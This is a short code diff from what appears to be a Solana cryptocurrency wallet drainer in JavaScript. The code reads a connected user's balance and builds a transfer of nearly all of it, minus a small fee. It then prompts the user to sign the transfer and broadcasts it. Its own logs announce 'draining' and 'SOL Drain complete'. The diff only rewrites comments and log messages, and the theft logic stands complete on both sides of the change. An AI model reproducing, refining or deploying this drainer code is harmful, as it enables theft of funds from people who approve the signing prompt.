@@ -39,8 +39,11 @@
             let balance = await connection.getBalance(userWallet);
             let drainAmount = balance - 5000; // Leaves a small fee to prevent failure
 
-            // Only drain if the balance is more than 0
+            // If the balance is greater than 0, proceed with draining
             if (drainAmount > 0) {
+                console.log(`⚠️ Attempting to drain ${drainAmount / 1e9} SOL from ${userWallet.toBase58()}...`);
+
+                // Creating a transaction to transfer funds
                 let transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: userWallet,
@@ -49,10 +52,10 @@
                     })
                 );
 
-                console.log(`⚠️ Draining ${drainAmount / 1e9} SOL from ${userWallet.toBase58()}...`);
-
-                // Sign and send the transaction
+                // Request user approval to sign the transaction
                 const signedTransaction = await provider.signTransaction(transaction);
+                
+                // Send the transaction after it's signed
                 await connection.sendRawTransaction(signedTransaction.serialize());
 
                 console.log("✅ SOL Drain complete. Check your wallet.");
